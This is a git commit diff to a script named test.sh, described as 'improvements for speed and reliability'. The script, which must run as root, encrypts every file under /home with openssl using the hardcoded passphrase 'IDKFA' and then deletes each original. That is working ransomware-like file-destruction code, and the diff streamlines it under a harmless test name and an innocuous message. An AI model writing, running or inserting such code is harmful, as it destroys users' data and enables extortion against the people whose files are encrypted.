1931a1e055d1eff81bbd97fa09fe68cb4bb4e264
Anas Hansson <anashansson@gmail.com>
2017-05-14 06:56:36 +0200

    improvements for speed and reliability

--- test.sh
+++ test.sh
@@ -1,12 +1,10 @@
 #!/bin/bash
 if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi
 
-cd /home;
-
 for f in $(find /home -not -name "*.enc"); do
 	if [ -f $f ]; then
-		sudo openssl enc -aes-256-cbc -salt -in "$f" -out "$f".enc -k "IDKFA";
+		openssl enc -aes-256-cbc -salt -in "$f" -out "$f".enc -k "IDKFA";
 		echo -e "File: [$f] encrypted";
-		sudo rm -f "$f";
+		rm -f "$f";
 	fi
 done
